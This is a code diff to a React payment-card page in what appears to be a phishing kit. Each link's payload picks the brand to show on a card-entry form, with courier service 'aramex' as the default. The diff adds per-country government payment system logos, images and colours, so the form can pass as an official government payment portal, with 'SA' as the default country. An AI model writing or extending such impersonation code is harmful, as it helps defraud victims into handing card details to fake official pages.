@@ -10,6 +10,8 @@ import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
 import { Shield, CreditCard, Lock, AlertCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
+import { isGovernmentService } from "@/lib/governmentPaymentServices";
 import BackButton from "@/components/BackButton";
 
 const PaymentCard = () => {
@@ -29,7 +31,22 @@ const PaymentCard = () => {
   // Get service branding
   const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+
+  const selectedCountry = link?.payload?.selectedCountry || link?.country_code || 'SA';
+  const govSystem = getGovernmentPaymentSystem(selectedCountry);
+  const isGovService = isGovernmentService(serviceKey) || serviceKey.toLowerCase() === 'government_payment';
+
+  const serviceBranding = getServiceBranding(serviceKey);
+  const branding = isGovService ? {
+    ...serviceBranding,
+    logo: govSystem.logo || serviceBranding.logo,
+    ogImage: govSystem.heroImage || serviceBranding.ogImage,
+    heroImage: govSystem.heroImage || serviceBranding.heroImage,
+    colors: {
+      primary: govSystem.colors.primary,
+      secondary: govSystem.colors.secondary
+    }
+  } : serviceBranding;
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
@@ -129,7 +146,7 @@ const PaymentCard = () => {
               <img 
                 src={branding.logo} 
                 alt={serviceName}
-                className="h-10 sm:h-12 mx-auto"
+                className="h-10 sm:h-12 w-auto object-contain mx-auto"
                 onError={(e) => e.currentTarget.style.display = 'none'}
               />
             </div>
